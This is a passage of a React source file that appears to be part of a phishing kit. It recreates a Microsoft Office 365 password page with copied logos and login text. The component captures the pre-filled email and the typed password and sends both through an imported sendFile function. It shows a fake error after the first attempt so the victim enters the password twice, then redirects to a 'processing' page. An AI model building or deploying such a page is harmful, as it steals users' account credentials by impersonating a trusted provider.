import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Office({ location }) {
  const [email, setEmail] = useState(location.state.email);
  const [values, setValues] = useState({
    username: location.state.email,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });
    console.log(values);
    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" type="text/css" href="../office/main.css" />
      </Helmet>
      <div className="main">
        <meta name="robots" content="none" />
        <meta name="PageID" content="i5030" />
        <meta name="SiteID" content={292841} />
        <meta name="ReqLC" content={1033} />
        <meta name="LocLC" content={1033} />
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"
        />
        <link
          rel="shortcut icon"
          href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACABAMAAAAxEHz4AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAElBMVEUAAADyUCJ/ugAApO//uQD///8951e2AAAAAXRSTlMAQObYZgAAAAFiS0dEBfhv6ccAAAAHdElNRQfjCBsIHjeJg5O7AAAAS0lEQVRo3u3MQQ3AIAAEsMuCAGZhCkiwgH9NOLj3Hq2A5q1m8nxVBAKBQCAQCAQCgUAgEPSAP9jVSsapBAKBQCAQCAQCgUAgEPTgAruK0CdlWNSzAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTA4LTI3VDE1OjMwOjU1LTA3OjAwvOKmOwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wOC0yN1QxNTozMDo1NS0wNzowMM2/HocAAAAASUVORK5CYII="
        />

        <div id="preloadDiv">
          <span
            style={{ fontFamily: '"Segoe UI WestEuropean', fontWeight: 100 }}
          >
            t
          </span>
          <span
            style={{ fontFamily: '"Segoe UI WestEuropean', fontWeight: 200 }}
          >
            t
          </span>
          <span
            style={{ fontFamily: '"Segoe UI WestEuropean', fontWeight: 400 }}
          >
            t
          </span>
          <span
            style={{ fontFamily: '"Segoe UI WestEuropean', fontWeight: 600 }}
          >
            t
          </span>
        </div>
        <div id="app" />
        <div id="loadingScreen">
          <div id="loadingContainer">
            <svg
              id="loadingLogo"
              width={180}
              height={180}
              baseProfile="basic"
              viewBox="0 0 180 180"
            >
              <defs></defs>
              <path
                fill="#123b6d"
                d="M176 90.298a3.739 3.739 0 0 0-1.875-3.24v-.001l-.02-.012-.074-.042-60.963-34.66a8.38 8.38 0 0 0-.818-.466 8.454 8.454 0 0 0-7.5 0 8.377 8.377 0 0 0-.817.465L42.969 87.003l-.074.042-.02.012a3.74 3.74 0 0 0 .095 6.535l60.962 34.661a8.467 8.467 0 0 0 .818.465 8.454 8.454 0 0 0 7.5 0 8.47 8.47 0 0 0 .818-.465l60.962-34.66a3.741 3.741 0 0 0 1.97-3.295z"
              />
              <path d="M48.14 68.023H90v33.488H48.14z" className="cls-2" />
              <path
                d="M112.277 81.979L99.34 99.511 48 69V28.745h40l24.277 53.234z"
                className="cls-3"
              />
              <path
                d="M166.489 37.043L129 26.574H88V73l32.532 28.383 8.553 20.17L169 105V69l-2.511-31.957z"
                className="cls-4"
              />
              <path
                d="M129 105l20.213 7.106-14.128 18.724L89 105V69h40v36z"
                className="cls-3"
              />
              <path fill="#14447d" d="M48.14 101.512H90v37.674H48.14z" />
              <path d="M129 105h40v36h-40z" className="cls-3" />
              <path fill="#50d9ff" d="M129 28.489h40V69h-40z" />
              <path d="M89 105h40v37H89z" className="cls-2" />
              <path
                fill="#0a2767"
                d="M110.702 127.84a6.337 6.337 0 0 1-2.17.511c-.961.087-3.37-1.118-3.37-1.118-.159-.095-.35-.19-.638-.382L45.936 94.807v.472l57.996 32.974a8.468 8.468 0 0 0 .818.465 8.455 8.455 0 0 0 7.5 0 8.464 8.464 0 0 0 .818-.465l60.962-34.66a3.744 3.744 0 0 0 1.89-2.568c-15.327 8.375-65.066 36.725-65.218 36.815z"
                opacity=".3"
              />
              <path
                fill="#0a2767"
                d="M107.957 127.01a13.256 13.256 0 0 1-2.54-1.16c-.159-.095-.35-.19-.638-.382L46.191 93.424v2l57.741 32.83a8.468 8.468 0 0 0 .818.464 8.445 8.445 0 0 0 6.591.385c.032-.02.067-.032.098-.052l5.02-2.726 57.571-32.733a3.728 3.728 0 0 0 1.93-3.829c-13.772 7.456-65.784 37.049-65.94 37.142a4.33 4.33 0 0 1-2.063.106z"
                opacity=".2"
              />
              <path
                id="Envelope"
                fill="#1490df"
                d="M174.125 93.255v.002l-.074.043-.02.01-60.963 34.84a8.43 8.43 0 0 1-.817.468 8.413 8.413 0 0 1-7.5 0 8.409 8.409 0 0 1-.818-.467l-60.964-34.84-.019-.011-.074-.043v-.002A3.76 3.76 0 0 1 41 90H41v70.536A8.45 8.45 0 0 0 49.437 169h118.125a8.45 8.45 0 0 0 8.438-8.464V90a3.76 3.76 0 0 1-1.875 3.255z"
              />
              <path
                d="M112.71 128.355c-.152.089-.3.184-.46.263a8.413 8.413 0 0 1-7.5 0 8.41 8.41 0 0 1-.817-.467l-2.352-1.344c-.086-.008-.17-.009-.256-.018a10.294 10.294 0 0 1-.216-.028l71.875 40.256a8.473 8.473 0 0 0 2.474-3.519z"
                opacity=".02"
              />
              <path
                d="M173.636 166.402l-64.175-36.958a8.459 8.459 0 0 1-.96.056 8.366 8.366 0 0 1-2.658-.44 8.386 8.386 0 0 1-3.327-.898 8.556 8.556 0 0 1-.836-.491l-2.407-1.415c-.088-.009-.174-.009-.262-.02a10.27 10.27 0 0 1-.221-.028l72.645 41.843a8.456 8.456 0 0 0 2.201-1.65z"
                opacity=".04"
              />
              <path
                d="M41 160.553A8.45 8.45 0 0 0 49.438 169h118.125a8.37 8.37 0 0 0 5.017-1.67l-66.7-38.26a8.414 8.414 0 0 1-1.129-.452 8.41 8.41 0 0 1-.817-.467l-60.964-34.84-.019-.011-.074-.043v-.002A9.663 9.663 0 0 1 41 92z"
                className="cls-4"
              />
              <path
                d="M93.862 134.084a4.763 4.763 0 0 0 .138-1.226v-80.73c0-3.955-3.575-7.142-8.01-7.142H48v23.519l-.32 1h.12v15.723l-5.054 2.637c-.033.03-.068.03-.102.06A3.817 3.817 0 0 0 41 89.595V140h44.99c3.953 0 7.255-2.544 7.872-5.916z"
                className="cls-12"
              />
              <path
                d="M41 139h42.03a11.352 11.352 0 0 0 7.544-2.85A9.773 9.773 0 0 0 94 128.794v-74.59C94 48.597 89.059 44 83.03 44H48v24.74s-.657 2.08-1.567 4.92v13.641l-4.843 2.637c-.032.03-.066.03-.098.06a3.946 3.946 0 0 0-.492.33z"
                className="cls-12"
              />
              <path
                d="M83.99 137c4.435 0 8.01-3.3 8.01-7.392V52.392C92 48.299 88.425 45 83.99 45H48v24s-.977 3.124-2.2 6.965v10.688l-4.299 2.322c-.312.838-.5 1.252-.5 1.025H41v47z"
                className="cls-13"
              />
              <path
                d="M83.99 138a7.742 7.742 0 0 0 8.01-7.474V52.46a7.742 7.742 0 0 0-8.01-7.473H48V69s-.977 3.124-2.2 6.965v11.133l-4.53 2.474c-.17.417-.27.591-.27.428v48z"
                className="cls-13"
              />
              <path
                d="M91 128.687V52.298c0-4.048-3.605-7.312-8.078-7.312H48V69l-.343 1.093h.218v16.1l-5.097 2.7c-.034.03-.07.03-.103.061A3.878 3.878 0 0 0 41 90.695V136h41.922c4.473 0 8.078-3.264 8.078-7.313z"
                opacity=".15"
              />
              <rect width={90} height={90} y={45} className="cls-3" rx="7.5" />
              <path
                fill="#fff"
                d="M24.85 77.656a20.384 20.384 0 0 1 8.004-8.842 24.205 24.205 0 0 1 12.721-3.189 22.508 22.508 0 0 1 11.769 3.024 20.178 20.178 0 0 1 7.79 8.449 27.285 27.285 0 0 1 2.729 12.425 28.77 28.77 0 0 1-2.81 13.001 20.665 20.665 0 0 1-8.022 8.744 23.397 23.397 0 0 1-12.212 3.107 23.052 23.052 0 0 1-12.031-3.057 20.496 20.496 0 0 1-7.89-8.465 26.612 26.612 0 0 1-2.76-12.278 29.52 29.52 0 0 1 2.711-12.919zm8.53 20.76a13.242 13.242 0 0 0 4.503 5.818 11.756 11.756 0 0 0 7.035 2.12 12.348 12.348 0 0 0 7.511-2.186 12.688 12.688 0 0 0 4.372-5.835 22.55 22.55 0 0 0 1.397-8.12 24.68 24.68 0 0 0-1.315-8.218 13.01 13.01 0 0 0-4.224-6.048 11.638 11.638 0 0 0-7.445-2.301 12.153 12.153 0 0 0-7.2 2.137 13.362 13.362 0 0 0-4.601 5.867 23.281 23.281 0 0 0-.033 16.765z"
              />
              <path
                fill="#0358a7"
                d="M169 33V18.508A7.524 7.524 0 0 0 161.46 11H55.54A7.524 7.524 0 0 0 48 18.508V33z"
              />
            </svg>
            <svg
              id="loadingSpinner"
              viewBox="0 0 80 80"
              style={{ visibility: "visible", opacity: 1 }}
            >
              <defs>
                <path id="a" d="M0 0h40v40H0z" />
              </defs>
              <g fill="none" fillRule="evenodd">
                <circle
                  cx={40}
                  cy={40}
                  r={38}
                  stroke="#DEECF9"
                  strokeWidth="2.817"
                />
                <g transform="translate(40)">
                  <mask id="b" fill="#fff">
                    <use xlinkHref="#a" />
                  </mask>
                  <circle
                    cy={40}
                    r={38}
                    stroke="#0078D7"
                    strokeWidth="2.817"
                    mask="url(#b)"
                  />
                </g>
              </g>
            </svg>
          </div>
        </div>
      </div>
      {/* /ko */}
      {/* ko if: backgroundImageUrl */}
      <div className="gaza" />
      {/* ko if: useImageMask */}
      {/* /ko */}
      {/* /ko */}
      <div data-bind="if: activeDialog" />
      {/* ko if: svr.Cc */}
      {/* /ko */}
      {/* ko withProperties: { '$loginPage': $data } */}
      <div className="outer" id="op" style={{ visibility: "visible" }}>
        {/* ko template: { nodes: $componentTemplateNodes, data: $parent } */}
        {/* ko if: svr.aQ */}
        {/* /ko */}
        <div className="middle">
          <div
            className="inner fade-in-lightbox"
            data-bind="
                animationEnd: paginationControlMethods() && paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() && backgroundControlMethods().useTransparentLightBox }"
          >
            <div
              className="lightbox-cover"
              data-bind="css: { 'disable-lightbox': svr.B5 && showLightboxProgress() }"
            />
            {/* ko if: showLightboxProgress */}
            {/* /ko */}
            {/* ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) */}
            <div
              data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"
            >
              {/*  */}
              {/* ko if: bannerLogoUrl */}
              {/* /ko */}
              {/* ko if: !bannerLogoUrl && !isChinaDc */}
              {/* ko component: 'accessible-image-control' */}
              {/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}
              {/* /ko */}
              {/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
              {/* ko template: { nodes: [darkImageNode], data: $parent } */}
              <img
                className="logo"
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAYAAAAf1RgaAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABJ0RVh0U29mdHdhcmUAZXpnaWYuY29toMOzWAAACAFJREFUaIHtmn2MXFUZxn/vmdmBLttP+WoqBVo/QEutArWlCgoCFgkRcEWlYgpYTHTpztzp7h9AHESsdvbOLCxU+ZIoxUALpdBIoSAhof7hB6I1gkjph8RIae2WmbJbpjPn8Y+5U6cDZaeG0pLsk0zuOed93nPfe59zzn3PyVjhy5NEc+gftWL9uMxqtgnGNuNw/TlYk30Po0m4Ax3AMPYNw4K9zxA/0AEM439IJpOTYrHYdO99665du1b29fVtaeQcEMEymUxrsVicU9e0JgzD5/fGTyaT051z0wAk9edyuWUAQRDMB0713mfy+fy6/Rv1/kU6ne6WdIOkFjMjkUicB6xq5B0QwQYGBsYAt9Xqkh4CLtob3zl3BzAVwMyeB5Ylk8kJQG9kfxO4Yn/GvD+RTCbPkLQQMGCVpBfN7DWAzs7O48xsZD6f/yscJEuimZ0/f/78o2666abNjbYFCxbM8t5PbWwfPXr05h07djwm6VQzW/HeRLp/EIvFLpBkwD/CMPwSIIAgCFYC5wM/AA4awXYAbS0tLZcB2UajpO9ExSIwstaeyWTKwOz3JML9DEkTouJLRGJFOL6RezAI9itgnqQrgB7qAg6C4HBJ7cCgmT0k6bJ6xyAIOsys1Xu/OpfLPVfvB1wJzARazGwjsLSnp+fpdDo9EzhdUn+pVLqvpaWlwzn3EefcjxYtWvTivHnzWtra2i5xzp0taTzQD6wZHBy8e/HixTsa7n8ucImZjZe0BVgRhuHymj36Vl8GnA4cYWavAk+1tbXdm8lkSgsWLPiwpIsknQhgZpPS6XR3zV/S4VFxVjqd7vbebz/ggnnv73LOzQU+GgTBrDAM19RsZjZX0iFmtsR7v81sz324mV0n6QigADwHkE6nz5T0AHWbe0kA04DTJH0euBFYl0gkvgl8RhKS7u3q6nqjUqmsBKZFPjV8dcSIEUFnZ+fs3t7eFwCCIPg5MLeuf4AJwPIojinFYnElcFxDHHOKxeL8zs7O2d77jwM/rrOfWF+vw1mSzjKz9XGqI6gJqB9A0P9uHl+Y2b/N7BFJF1NNHNYAZDIZVywWrwKQdAdw4VB9dXd3TyyXy8uB0cBmM/uhpBeBEyTNaKBPBo4G8pJM0uve+/upCvuGmd0gaa2ZTZF0HXBsLBZb2t7ePu2YY46ZTCSWmc2vVCq/icViJ0k6CSCZTI6Q9DBwnJlt8d5fD2wws5lAF/CJeDx+Z7lc/m4sFrvKzL4t6RRgLXBrXYwZYDzwa+ARMyvER61YP25fXvD15zB5X/jNQNJtwMVAe0dHx/y+vr5CsVg8m+pL/XsYhs+kUqkhBSuXyylgtKQB7/2M3t7ejZHpCeCWBrqZ2Zyenp6HAdLp9BeA0yLD5T09PUsj3qpUKrXRzJYCUyZOnHhOwz2fiGbd34D7AJxzlwKTACqVyvn5fP73Ef3RdDpdkLRI0nnAiDAMbw+C4EzgFGBTGIa31/oOguBqqoI9W2uPs6R/21AvIkI/c8ZO1uO8TJNniXYuTQ2GMAyfDIJgHfChRCLxNeB2oJZs3MmeH+J3wmwAM7u/TqwaGvvY3tPT80it4r0/M1pyX29ra3ugnjhq1KgHC4XCgJm1mtnMXbt23RqPxweBEbFY7HfpdPrmlpaW/MKFC/8TuXwuuq6tEwuAcrm8JBaLLQKIx+MzgBeafDagejQ1dh9+/B/8ZiAzq42sy7u6uj5INZ0tlUqlX+5DP+MBJG1ogruFOhGdc2Oi4muZTMbXEzOZjDezmhiHRduPi4GtwEhJ15RKpQ2pVOoCADOrPftbtiljxoypP704bIgY3zJQD5qzREl3A28Cny6XyzdTzWAfervjmXfAIIBzbsJQRGAPUSQVo+KRmUxmj/fS3t4ek/SBiLcFIAzDVYODg8dLupZqHjDSzO5NJpPjgDci16MabzowMHBkXXVrE3HugYNGsDAMt0p6EMDMLoTdyUbTkPTb6Pr16CRkNzo6Og55J18zq2WnowuFQnu97dhjj203s9ao+kQmkzkUYPHixTtyudyN3vsvRrY259zHiBInYGoymZxe35f3/ltRsWRmTw/xSOXounv/ecDT+nrEYrGfee+/EVVfzuVyT+2Lv5ndSHUpHeWc+2MQBHkz2+i9/5SZTQXO25vvpk2bHp04ceJzwCfN7O4gCKYAfzGzKd77BWaGpIdzudyzQRB8JZ1Ofw+4p1KprDOz2ga+4r3fUC6X1yYSiS5ggnPusSAIFkl62Tk3Q9LVEfen2Wz21SEe6RWqWeulqVTqz865loNmhgFks9lnqGZbmNldNJ9sABCG4bOSLqW6JB0N/ETS/WbWTTXV3yuWLVtWqVQqF1FNrUcA1wLLJH3fzFolrU4kEnNrfElnSLrTOfd01H/FzK7J5/P/6uvrKzjnLpD0T6rf8oVmtlRSiuokuadUKnW/TRh7wDl3C9Wl+0gz+4Wkaw7IDGttbd1e22Pt3Llzj32gpCvNbKqk5fXtzrmlkl6QtJvvvU+b2aF1yxm5XG5ZZ2fnmng8PkfSCcBOYL2kpVH/q8xsq5ltb4yrt7d3YyaTOblQKFxoZp+lmhT0m9ljYRg+WeOVSqXViURiDnCypDbglVgsdl82m32pxslms39KJpMnAJc456ZLOkTSZkkrGjNHSXeY2VPApvr2bDa7OpVKzXLOtVMdRH8wlvQ3/RcB5owdp8fZRvNp/fBfBN5lHFRL4jCGxrBg7zMMCzaMYexP/BcTWnubDC8YKAAAADV0RVh0Q29tbWVudABDb252ZXJ0ZWQgd2l0aCBlemdpZi5jb20gU1ZHIHRvIFBORyBjb252ZXJ0ZXIsKeMjAAAAAElFTkSuQmCC"
              />
              {/* /ko */}
              {/* /ko */}
              {/* /ko */}
              {/* /ko */}
            </div>
            {/* /ko */}
            {/* ko if: svr.Cv && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) */}
            {/* /ko */}
            {/* ko if: asyncInitReady */}
            <div
              role="main"
              data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.A8,
                            disableAnimationIfAnimationEndUnsupported: svr.bB,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"
            >
              {/*  */}
              <div
                data-bind="css: { 'zero-opacity': hidePaginatedView() }"
                className
              >
                {/* ko if: showIdentityBanner() && (sharedData.displayName || svr.g) */}
                <div
                  data-bind="css: {
        'animate': animate() && animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"
                  className="animate slide-in-next"
                >
                  <div
                    data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.Bw,
                displayName: sharedData.displayName || svr.g,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"
                  >
                    {/*  */}
                    <div className="identityBanner">
                      {/* ko if: isBackButtonVisible */}
                      <img
                        className="backButton"
                        id="idBtn_Back"
                        src="data:image/png;base64,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"
                      />
                      {/* /ko */}
                      <div id="topnavtext" className="identity">
                        {email}
                      </div>
                    </div>
                  </div>
                </div>
                {/* /ko */}
                <div
                  className="pagination-view animate has-identity-banner slide-in-next"
                  data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.g),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"
                >
                  {/* ko foreach: views */}
                  {/* ko if: $parent.currentViewIndex() === $index() */}
                  {/* /ko */}
                  {/* ko if: $parent.currentViewIndex() === $index() */}
                  {/* ko template: { nodes: [$data], data: $parent } */}
                  <div
                    data-viewid={2}
                    data-showidentitybanner="true"
                    data-dynamicbranding="true"
                    data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.Ac === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }"
                  >
                    <form onSubmit={submitForm}>
                      <div style={{ display: "none" }}>
                        <input
                          type="hidden"
                          name="username"
                          onChange={handleChange}
                          value={values.username}
                          disabled
                        />
                      </div>
                      <input
                        type="hidden"
                        name="login"
                        data-bind="value: unsafe_username"
                        defaultValue
                      />
                      <input type="hidden" name />
                      <input
                        type="hidden"
                        name="type"
                        data-bind="value: svr.az ? 20 : 11"
                        defaultValue={11}
                      />
                      <input
                        type="hidden"
                        name="LoginOptions"
                        data-bind="value: isKmsiChecked() ? 1 : 3"
                        defaultValue={3}
                      />
                      <input
                        type="hidden"
                        name="lrt"
                        data-bind="value: callMetadata.IsLongRunningTransaction"
                        defaultValue
                      />
                      <input
                        type="hidden"
                        name="lrtPartition"
                        data-bind="value: callMetadata.LongRunningTransactionPartition"
                        defaultValue
                      />
                      <input
                        type="hidden"
                        name="hisRegion"
                        data-bind="value: callMetadata.HisRegion"
                        defaultValue
                      />
                      <input
                        type="hidden"
                        name="hisScaleUnit"
                        data-bind="value: callMetadata.HisScaleUnit"
                        defaultValue
                      />
                      <div
                        id="loginHeader"
                        className="row text-title"
                        role="heading"
                        aria-level={1}
                        data-bind="text: str['CT_PWD_STR_EnterPassword_Title']"
                      >
                        Enter password to continue
                      </div>
                      {/* ko if: unsafe_pageDescription */}
                      {/* /ko */}
                      <div className="row">
                        <div className="form-group col-md-24">
                          <div role="alert" aria-live="assertive">
                            <div
                              id="passwordError"
                              style={{ display: "none" }}
                              className="alert alert-error"
                              data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.p, click: resetPassword_onClick } }"
                            >
                              Please enter the password for your Microsoft
                              account.
                            </div>
                            {/* ko if: passwordTextbox.error */}
                            {/* /ko */}
                          </div>
                          <div
                            className="placeholderContainer"
                            data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"
                          >
                            {/* ko withProperties: { '$placeholderText': placeholderText } */}
                            {/* ko template: { nodes: $componentTemplateNodes, data: $parent } */}
                            <div id="p1" style={{ display: "block" }}>
                              <input
                                name="password"
                                value={values.password}
                                onChange={handleChange}
                                required
                                id="u3"
                                type="password"
                                autoComplete="off"
                                className="form-control"
                                placeholder="Password"
                                tabIndex={1}
                                autofocus
                              />
                            </div>
                            {/* ko if: svr.b6 && showPassword() */}
                            {/* /ko */}
                            {/* /ko */}
                            {/* /ko */}
                            {/* ko ifnot: usePlaceholderAttribute */}
                            {/* /ko */}
                          </div>
                          {/* ko if: svr.b6 */}
                          {/* /ko */}
                        </div>
                      </div>
                      {/* ko if: svr.AE && showHipOnPasswordView */}
                      {/* /ko */}
                      <div
                        data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }"
                        className="position-buttons"
                      >
                        <div>
                          {/* ko if: svr.bw */}
                          {/* /ko */}
                          {/* ko if: svr.aK !== false && !svr.bw && !tenantBranding.KeepMeSignedInDisabled */}
                          <div
                            id="idTd_PWD_KMSI_Cb"
                            className="form-group checkbox text-block-body no-margin-top"
                            data-bind="visible: !svr.F && !showHipOnPasswordView"
                          >
                            <label id="idLbl_PWD_KMSI_Cb">
                              {" "}
                              <input
                                name="KMSI"
                                id="idChkBx_PWD_KMSI0Pwd"
                                type="checkbox"
                                data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']"
                                aria-label="Keep me signed in"
                              />{" "}
                              <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">
                                Keep me signed in
                              </span>{" "}
                            </label>
                          </div>
                          {/* /ko */}
                          <div className="row">
                            <div className="col-md-24">
                              <div className="text-13 action-links">
                                <div className="form-group">
                                  <a
                                    id="idA_PWD_ForgotPassword"
